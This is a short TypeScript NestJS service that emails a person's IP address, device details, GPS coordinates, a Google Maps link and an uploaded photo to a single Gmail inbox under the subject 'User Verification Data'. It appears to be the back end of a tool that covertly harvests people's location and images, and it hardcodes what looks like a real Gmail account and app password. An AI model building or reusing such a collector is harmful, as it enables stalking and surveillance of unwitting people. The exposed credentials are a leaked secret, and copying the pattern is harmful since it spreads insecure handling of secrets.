import * as nodemailer from 'nodemailer';
import { Injectable } from '@nestjs/common';

@Injectable()
export class CollectService {
  async sendEmail(data: any) {
    const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;

    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 465,
      secure: true,
      auth: {
        user: "kumawatmanish686@gmail.com",
        pass: "itktaibmxitwovxp",
      },
    });

    await transporter.sendMail({
      from: "kumawatmanish686@gmail.com",
      to: "kumawatmanish686@gmail.com",
      subject: '📸 User Verification Data',
      text: `
IP Address: ${data.ip}

Device Info:
${data.deviceInfo}

GPS Location:
Latitude: ${data.latitude}
Longitude: ${data.longitude}

Google Maps Link:
${mapLink}

Time:
${new Date().toLocaleString()}
      `,
      attachments: [
        {
          filename: 'photo.jpg',
          content: data.photo.buffer,
        },
      ],
    });
  }
}
